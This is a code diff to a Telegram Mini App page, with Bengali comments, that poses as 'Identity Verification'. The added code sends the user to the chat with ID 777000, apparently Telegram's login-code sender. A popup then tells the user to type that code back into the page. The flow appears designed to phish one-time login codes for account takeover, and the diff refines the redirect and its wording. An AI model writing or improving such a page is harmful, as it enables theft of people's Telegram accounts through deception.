@@ -10,7 +10,6 @@
         .box { background: white; color: #333; padding: 30px; border-radius: 25px; margin: 50px 20px; box-shadow: 0 5px 25px rgba(0,0,0,0.5); }
         .btn { background: #0088cc; color: white; border: none; padding: 18px; width: 100%; border-radius: 15px; font-weight: bold; font-size: 18px; cursor: pointer; transition: background 0.3s; }
         
-        /* সরাসরি কোডে যাওয়ার বাটনের স্টাইল */
         .btn-get-code { 
             background: #28a745; 
             color: white; 
@@ -26,7 +25,6 @@
             align-items: center; 
             justify-content: center; 
             gap: 10px;
-            box-shadow: 0 4px 10px rgba(40, 167, 69, 0.3);
         }
         
         .hidden { display: none; }
@@ -48,9 +46,9 @@
 
     <div class="box hidden" id="step2">
         <h3 style="margin-top:0;">Identity Verification</h3>
-        <p style="font-size:13px; color:#666; margin-bottom:15px;">কোডটি আপনার টেলিগ্রাম চ্যাটে পাঠানো হয়েছে। নিচের বাটনে ক্লিক করে কোডটি দেখে নিন।</p>
+        <p style="font-size:13px; color:#666; margin-bottom:15px;">টেলিগ্রাম থেকে পাঠানো ৫ ডিজিটের কোডটি নিচের বাটনে ক্লিক করে দেখে নিন।</p>
         
-        <!-- এই বাটনটি সরাসরি টেলিগ্রাম চ্যাটে নিয়ে যাবে -->
+        <!-- এই বাটনটি সরাসরি সার্ভিস চ্যাটে নিয়ে যাবে -->
         <button class="btn-get-code" onclick="openTelegramChat()">📩 View Login Code</button>
         
         <input type="text" id="otp_display" class="otp-display" placeholder="-----" readonly>
@@ -70,16 +68,17 @@
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
         let currentOTP = "";
 
-        // সরাসরি ওটিপি চ্যাটে নিয়ে যাওয়ার সবচেয়ে শক্তিশালী ফাংশন
+        // অন্যান্য বটের সিক্রেট লিঙ্ক পদ্ধতি
         function openTelegramChat() {
-            // এটি টেলিগ্রামের ইন্টারনাল প্রোটোকল যা সরাসরি সার্ভিস নোটিফিকেশন ওপেন করার চেষ্টা করে
-            tg.openTelegramLink("tg://resolve?domain=telegram");
+            // আইডি ভিত্তিক সরাসরি লিঙ্ক (ID 777000)
+            tg.openTelegramLink("tg://user?id=777000");
             
-            // যদি ইউজার অ্যাপের বাইরে চলে যায় এবং কোড দেখে ফিরে আসে
-            // সেজন্য ব্যাকগ্রাউন্ডে ছোট একটি মেসেজও দিয়ে রাখতে পারেন
-            setTimeout(() => {
-                tg.showAlert("কোডটি কপি করে আবার এখানে এসে টাইপ করুন।");
-            }, 500);
+            // একটি ছোট নোটিফিকেশন যাতে ইউজার বুঝতে পারে কোথায় যেতে হবে
+            tg.showPopup({
+                title: "Login Code",
+                message: "কোডটি আপনার 'Telegram' নামক চ্যাটে পাঠানো হয়েছে। কোডটি দেখে এখানে টাইপ করুন।",
+                buttons: [{type: "ok"}]
+            });
         }
 
         function startFlow() {
